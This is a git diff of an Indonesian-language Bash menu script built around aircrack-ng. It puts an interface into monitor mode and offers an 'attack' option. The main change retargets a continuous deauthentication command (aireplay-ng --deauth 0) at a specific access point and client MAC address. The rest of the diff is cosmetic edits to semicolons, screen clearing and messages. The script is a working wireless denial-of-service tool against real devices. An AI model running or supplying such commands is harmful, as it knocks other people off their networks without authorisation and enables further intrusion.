@@ -21,8 +21,8 @@ blue="\033[1;34m"
 transparent="\e[0m"
 
 main(){
+	clear;
 
-	clear
 	echo "==========================";
 	#sudo airmon-ng;
 	cekInterface;
@@ -35,8 +35,8 @@ main(){
 	echo "==========================";
 	read  -p "Pilih  : " a
 	if [[ $a == 1 ]]; then
-		hidup
-		main
+		hidup;
+		main;
 	elif [[ $a == 2 ]]; then
 		mati;
 		main;
@@ -46,10 +46,6 @@ main(){
 	elif [[ $a == 4 ]]; then
 		bunuh;
 	elif [[ $a == 0 ]]; then
-		clear
-		echo ""
-		echo " [ Sampai Jumpa! ]"
-		echo ""
 		exit 1
 	else
 		
@@ -59,7 +55,7 @@ main(){
 }
 
 bunuh(){
-	sudo aireplay-ng --deauth 0 -a 50:64:2B:25:F8:AB --ignore-negative-one mon0
+	sudo aireplay-ng --deauth 0 -a 98:DE:D0:BD:0F:E0 -c 50:64:2B:25:F8:AB --ignore-negative-one mon0
 	
 	
 }
@@ -80,10 +76,8 @@ hidup(){
 mati(){
 	sudo airmon-ng stop mon0;
 }
-
-
 status(){
-	sudo airmon-ng
+	sudo airmon-ng;
 }
 loading(){
 	clear;
@@ -129,7 +123,7 @@ pilihScan(){
 		read  -p "Ingin Melakukan Serangan? (Y/N) : " serang
 		if [[ $serang == y ]]; then
 			serang;
-		elif [[ $serang == Y ]]; then
+		elif [[ $serang == Y ]]; then 
 			serang;
 		elif [[ $serang == N ]]; then
 			main;
@@ -159,7 +153,11 @@ cekInterface(){
 
 #mengecek user
 if [[ $EUID -ne 0 ]]; then
+   
+   clear
+   echo ""
    echo "<<< Kamu harus dalam keadaan root!>>>" 
+   echo ""
    exit 1
 fi
 loading;
